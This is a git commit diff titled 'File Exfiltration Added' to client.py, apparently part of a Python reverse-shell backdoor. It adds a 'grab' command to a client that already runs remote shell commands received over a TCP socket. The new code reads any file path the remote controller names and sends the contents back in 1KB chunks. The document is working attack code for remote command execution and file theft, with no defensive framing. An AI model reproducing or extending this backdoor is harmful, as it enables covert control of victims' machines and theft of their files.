877b8f829415481c7c597daef022cd0a8dc856c1
Apurv Singh Gautam <apurvsinghgautam@gmail.com>
2017-05-30 15:57:13 +0000

    File Exfiltration Added

--- client.py
+++ client.py
@@ -3,6 +3,18 @@
 import socket       #For building TCP Connection
 import subprocess   #To start he shell in the system
 
+def transfer(s,path):
+    if os.path.exists(path):    #Checking if the path exists in client computer
+        f=open(path,'rb')       
+        packet=f.read(1024)     #Reading 1KB from the file
+        while packet!='':   
+            s.send(packet)      #Sending 1KB to server side
+            packet=f.read(1024)
+        s.send('DONE')
+        f.close()
+    else:           #If File not Found
+        s.send('Unable to find out the file')
+   
 def connect():
 
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -14,7 +26,13 @@ def connect():
         if 'terminate' in command:
             s.close() #Close the socket
             break
-
+        elif 'grab' in command:   #grab*C:\Users\file-name
+            grab,path=command.split('*')      
+            try:
+                transfer(s,path)
+            except Exception,e:
+                s.send(str(e))
+                pass
         else:
             CMD=subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)  #Starting the shell
             s.send(CMD.stdout.read())  #Send the result
